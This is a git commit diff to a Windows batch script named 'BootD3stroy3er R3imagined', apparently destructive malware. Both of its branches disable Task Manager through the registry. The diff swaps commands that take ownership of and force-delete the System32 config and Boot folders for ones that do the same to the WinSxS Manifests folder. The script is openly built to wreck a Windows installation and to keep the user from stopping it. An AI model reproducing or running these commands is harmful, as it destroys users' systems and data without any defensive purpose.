8d3078e58b70ab174e3507e6d30dde6dee7e3a36
hunterhudspeth2030-arch <hunterhudspeth2030@gmail.com>
2025-11-24 19:34:49 -0700

    Update BootD3stroy3er R3imagined.bat

--- BootD3stroy3er R3imagined.bat
+++ BootD3stroy3er R3imagined.bat
@@ -7,23 +7,16 @@ if /i %input%==no goto B
 :A
 
 reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
-takeown /f "C:\Windows\System32\config"
-icacls "C:\Windows\System32\config"/grant administrators:F /t
-del /F /S /Q "C:\Windows\System32\config" 
-takeown "C:\Windows\System32\Boot" /f 
-icacls "C:\Windows\System32\Boot" /grant administrators:F /t 
-del /F /S /Q "C:\Windows\System32\Boot"
+takeown /f "C:\Windows\WinSxS\Manifests" 
+icacls "C:\Windows\WinSxS\Manifests" /grant administrators:F /t
+del /F /S /Q "C:\Windows\WinSxS\Manifests"
+
 
 
 :B 
 
 reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
-takeown /f "C:\Windows\System32\config"
-icacls "C:\Windows\System32\config"/grant administrators:F /t
-del /F /S /Q "C:\Windows\System32\config" 
-takeown "C:\Windows\System32\Boot" /f 
-icacls "C:\Windows\System32\Boot" /grant administrators:F /t 
-del /F /S /Q "C:\Windows\System32\Boot"
-
-
+takeown /f "C:\Windows\WinSxS\Manifests" 
+icacls "C:\Windows\WinSxS\Manifests" /grant administrators:F /t
+del /F /S /Q "C:\Windows\WinSxS\Manifests"
 
